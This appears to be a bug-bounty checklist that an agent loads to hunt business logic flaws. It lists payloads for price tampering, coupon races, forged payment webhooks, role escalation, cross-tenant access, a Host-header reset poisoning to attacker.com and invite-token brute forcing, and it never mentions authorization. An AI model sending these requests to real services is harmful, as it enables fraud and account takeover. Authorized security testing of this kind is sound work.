# High-Impact Business Logic Flaws — P1/P2 Only

> Load this file when hunting business logic OR when user says "check BLF" / "check business logic".
> Kill filter: a BLF is worth pursuing ONLY if the impact is one of:
> - Real money moves to the attacker
> - Attacker gets persistent high-privilege access
> - Attacker takes over another account
> - Repeatable at scale with direct financial / data damage
>
> Everything else (ghost features, rounding cents, flag flips, vote counts with no $ value) → kill fast, move on.

---

## Class 1 — Financial Theft / Value Extraction

The only question that matters: **does real value transfer to the attacker, confirmed by server state?**

### 1A. Price / Quantity Manipulation that Completes

**Signal:** any checkout / cart / order flow where price or quantity is a client-supplied parameter.

**Test:**
```bash
# Capture the checkout POST in Burp, modify price/amount/total/unit_price
# Then verify the ORDER is placed at the modified price — a 200 alone proves nothing
POST /api/checkout
{"items":[{"id":"prod_123","quantity":1,"price":0.01}]}   # was $99.99

# Also try:
{"items":[{"id":"prod_123","quantity":-1,"price":99.99}]}  # negative qty → negative charge
{"items":[{"id":"prod_123","quantity":0.001,"price":99.99}} # fractional → rounds to $0
{"items":[{"id":"prod_123","quantity":99999,"price":0.00}]} # zero price * large qty
```

**Proof bar:** re-fetch the order (`GET /api/orders/<id>`) and show `total_paid: 0.01` in the response AND the item is in "fulfilled/confirmed" state. Receipt or order confirmation = proof. A 200 on checkout POST alone is N/A.

**Parameters to always fuzz:** `price`, `amount`, `total`, `unit_price`, `subtotal`, `discount_amount`, `tax`, `shipping_cost`, `final_price`, `charge_amount`

---

### 1B. Refund / Reversal Without State Validation

**Signal:** refund or reversal endpoint exists. Target doesn't verify item returned, subscription cancelled, or service not consumed.

**Test:**
```bash
# 1. Purchase item / subscribe
# 2. Consume the item / use the service fully
# 3. Request refund — does server check consumption state?
POST /api/refunds {"order_id": "ord_123", "reason": "not_received"}

# Also: refund after chargeback already processed (double recovery)
# Also: refund a different user's order (IDOR-adjacent but logic-driven)
# Also: request refund for subscription → keep access → re-subscribe free
```

**Proof:** balance increased AND item/service still accessible after refund confirmed.

---

### 1C. Race Condition on Balance / Quota / Coupon

**Signal:** any "check balance → deduct" or "check coupon valid → mark used" flow. Non-atomic operations.

**Test:**
```bash
# Parallel requests — turbo intruder / race condition script
python3 - <<'EOF'
import threading, requests

def redeem():
    r = requests.post("https://TARGET/api/coupons/redeem",
        json={"code": "SAVE50"}, 
        headers={"Authorization": "Bearer TOKEN"})
    print(r.status_code, r.json())

threads = [threading.Thread(target=redeem) for _ in range(20)]
[t.start() for t in threads]
[t.join() for t in threads]
EOF

# Also: parallel withdrawal requests for same balance
# Also: parallel "use free trial" activations
```

**Proof:** multiple 200 responses with `"success": true` on the same one-use resource. Re-fetch balance/coupon state to confirm multiple deductions happened.

---

### 1D. Negative Balance / Overflow → Credit Creation

**Signal:** fintech, wallet, crypto, points system — any numeric balance.

**Test:**
```bash
# Withdraw more than balance
POST /api/withdraw {"amount": 999999999}

# Transfer negative amount (sender receives, receiver loses)
POST /api/transfer {"to": "victim_id", "amount": -500}

# Integer overflow: send MAX_INT + 1
POST /api/transfer {"amount": 9223372036854775808}

# Zero-value transaction for bonus trigger
POST /api/transfer {"amount": 0}  # does referral bonus trigger?
```

**Proof:** balance goes negative or exceeds original deposit. Re-fetch `/api/balance` — show the number.

---

### 1E. Currency / Conversion Confusion

**Signal:** multi-currency platform, app accepts amounts without explicit currency code.

**Test:**
```bash
# Send amount without currency code — does server default to weakest?
POST /api/charge {"amount": 100}        # missing currency field
POST /api/charge {"amount": 100, "currency": "IDR"}  # $100 becomes ~$0.006

# Switch currency after price locked
POST /api/checkout/confirm {"currency": "JPY"}  # price was set in USD

# Decimal separator confusion (EU vs US)
POST /api/charge {"amount": "1.000"}    # is this 1 or 1000?
```

**Proof:** transaction completes at wrong $ value. Show confirmed charge amount vs. expected.

---

## Class 2 — Privilege Escalation the Server Actually Honors

**Kill check first:** change the parameter → does the server's *response* change, AND does a *subsequent privileged action* succeed? A UI-only change = N/A.

### 2A. Role / Plan Parameter the Backend Trusts

**Test:**
```bash
# In request body
POST /api/settings {"role": "admin"}
POST /api/users/me {"plan": "enterprise", "is_premium": true}

# In headers (mass assignment via PUT)
PUT /api/users/me
{"username":"x","email":"x@x.com","role":"admin","is_verified":true}

# In JWT claims (if you can modify without sig check — alg:none)
# Decode JWT → change role → re-encode with alg:none or blank secret

# In cookies
Cookie: role=admin; plan=enterprise
```

**Proof:** after sending, call a privileged endpoint (`GET /api/admin/users`, `GET /api/billing/all`) — if it returns data, the server honored the escalated role.

---

### 2B. Checkout / Payment Step Skip → Zero-Dollar Order

**Signal:** multi-step checkout (select items → enter payment → confirm → fulfillment).

**Test:**
```bash
# Step 1: add to cart
POST /api/cart {"item_id": "prod_123"}

# Skip payment step — call fulfillment/confirm directly
POST /api/orders/confirm {"cart_id": "cart_abc", "payment_status": "paid"}

# Or: call confirm with no payment_intent
POST /api/orders {"items": [...], "skip_payment": true}

# Or: POST to the webhook endpoint directly with payment_status=succeeded
POST /api/webhooks/stripe {"type":"payment_intent.succeeded","data":{"object":{"id":"pi_fake","amount":9999}}}
```

**Proof:** order created in "confirmed/paid" state with $0 charged. Show order status + no payment record.

---

### 2C. KYC / Verification Workflow Bypass

**Signal:** regulated features (withdrawal, trading, sending large amounts) gated behind KYC.

**Test:**
```bash
# Submit KYC step 1, then call the step-3 endpoint directly
POST /api/kyc/submit-documents   # skip ID verification step
POST /api/kyc/complete            # call final step directly without completing prior steps

# Or: set kyc_status in profile update
PUT /api/users/me {"kyc_status": "verified", "kyc_level": 3}

# Or: access withdrawal endpoint before KYC check runs
POST /api/withdraw {"amount": 100}  # before completing KYC — does it block?
```

**Proof:** access to restricted feature confirmed (withdrawal succeeds, trading enabled) without completing verification.

---

### 2D. Subscription / Feature Gate Bypass

**Test:**
```bash
# Downgrade account, then access premium endpoint directly via API
# (UI shows locked but API doesn't recheck)
GET /api/reports/advanced
GET /api/export/full-data
POST /api/teams/create   # if teams is enterprise-only

# Free trial: does timer reset on account delete + recreate?
DELETE /api/account
POST /api/signup {"email": "new+1@attacker.com"}  # fresh trial

# Seat cap: add more members than plan allows
POST /api/teams/members {"email": "user51@x.com"}  # on a 50-seat plan
```

**Proof:** premium feature accessible on free/downgraded account, confirmed by API response returning real data.

---

## Class 3 — Tenant Isolation via Logic (not IDOR)

Distinct from IDOR: you're *authorized* for the action, but the target object belongs to another tenant. The auth check validates role, not ownership.

**Test:**
```bash
# You're a valid admin of org_A. Switch org context:
GET /api/reports?org_id=org_B
POST /api/billing/invoice {"org_id": "org_B", "amount": 0}

# Workspace / project context switch mid-session
PUT /api/projects/proj_B_id/settings {"name": "hacked"}  # proj_B belongs to org_B

# Invite yourself to another org via token brute or leaked invite
POST /api/invites/accept {"token": "INV_org_B_token"}

# Support/impersonation endpoint without proper tenant scope check
POST /api/admin/impersonate {"user_id": "user_in_org_B"}
```

**Proof:** server returns org_B data / confirms state change on org_B resources. Show org identifier in response confirming cross-tenant access.

---

## Class 4 — ATO via Business Logic

Not traditional auth bypass — the flaw is in the business rule, not the auth mechanism.

### 4A. Pre-Registration Account Hijacking

**Signal:** app supports SSO (Google/GitHub OAuth) AND email/password signup.

**Test:**
```bash
# 1. Register attacker@target.com with email/password before victim does
POST /api/signup {"email": "victim@company.com", "password": "attacker_controlled"}

# 2. Victim later signs in with Google SSO using same email
# 3. Does SSO link to attacker's existing account? Or create duplicate?
# If linked → attacker now shares the account

# Reverse: OAuth pre-hijack
# 1. Register via Google OAuth with victim's email (if provider doesn't verify)
# 2. Victim registers with email/password
# 3. Does password reset send to the email? Attacker receives it
```

**Proof:** log in as attacker after victim completes OAuth — attacker has access to victim's data.

---

### 4B. Password Reset Logic Bypass

**Test:**
```bash
# Host header injection → reset link goes to attacker's domain
POST /api/password/reset
Host: attacker.com
{"email": "victim@company.com"}

# Token not invalidated on email change
# 1. Request reset → get token
# 2. Change email (different session)
# 3. Use old token on new email account

# Reusable reset token
# 1. Request reset → use token
# 2. Use same token again — still works?

# Reset token leaks in Referer header
# Check if reset link is clicked and Referer logged by any analytics/CDN
```

**Proof:** attacker logs into victim's account using the bypassed reset flow.

---

### 4C. Invite / Magic Link Abuse

**Test:**
```bash
# Invite link doesn't bind to invited email — anyone who has the link can accept
GET /api/invites/accept/INV_TOKEN  # with different logged-in user

# Invite token reusable after acceptance
POST /api/invites/accept {"token": "INV_used_token"}  # send twice

# Invite token brute-forceable (short, sequential, predictable)
for i in $(seq 100000 200000); do
  curl -s "https://TARGET/api/invites/$i/accept" | grep -i "success\|user"
done

# Magic login link reuse — use same link twice
GET /api/auth/magic?token=TOKEN  # first use: logs in
GET /api/auth/magic?token=TOKEN  # second use: still works?
```

**Proof:** attacker gains access to victim's account or workspace via reused/stolen link.

---

## Class 5 — Mass Impact Automation (scale multiplier)

A finding that's P2 per-instance becomes P1 when automatable at scale.

### Signals that a finding is automatable:
- No rate limiting on the vulnerable endpoint
- No per-IP / per-account cap
- Can be triggered with a single account + no human interaction
- Financial gain compounds per iteration

### Test for automation viability:
```bash
# Run the exploit 10x in a loop — does it keep working?
for i in $(seq 1 10); do
  curl -s -X POST "https://TARGET/api/vuln-endpoint" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"exploit_payload": "..."}' | jq '.result'
done

# Check if rate limit exists
# If no 429 after 10 requests → automatable → P1 multiplier
```

**Report impact as:** "$X gain per cycle × unlimited cycles = unlimited financial damage."

---

## Kill List — Do NOT Chase These

| Finding | Why it's low/no impact |
|---------|----------------------|
| Ghost feature accessible via API but returns empty/error | No real data or action = N/A |
| Feature flag flip (UI only, server ignores) | Client-side cosmetic = N/A |
| Coupon code works once more than expected (1 extra use) | Minimal $ damage, usually N/A or Low |
| Vote/star/like count manipulation with no $ value | Informational unless tied to money/ranking with real $ |
| Rounding exploit that yields < $1 per cycle | Low unless automatable to large $ |
| Account lifecycle desync (cancelled but still logged in briefly) | Low unless premium access persists indefinitely |
| Async export job with slight timing window | Low unless another user's data is accessible |

---

## Proof Bar — Required Before Any Report

1. **Before state** — screenshot/curl showing correct state (real price, real balance, locked feature)
2. **Exploit** — exact curl/request with modified parameters
3. **After state** — re-fetch showing server-confirmed state change (not just 200 response)
4. **Scale** — what happens if repeated? Quantify in dollars or records
5. **No "may allow" / "could be used to"** — show it, don't speculate

---

## Coverage Ledger Fields

When this checklist is run on a target, mark in coverage.jsonl:
```json
{
  "host": "HOST",
  "blf_financial_checked": "done",
  "blf_privesc_checked": "done",
  "blf_tenant_checked": "done",
  "blf_ato_logic_checked": "done",
  "blf_mass_impact_checked": "done"
}
```

Phase 5 does NOT close on a target until all 5 BLF fields are `"done"`.
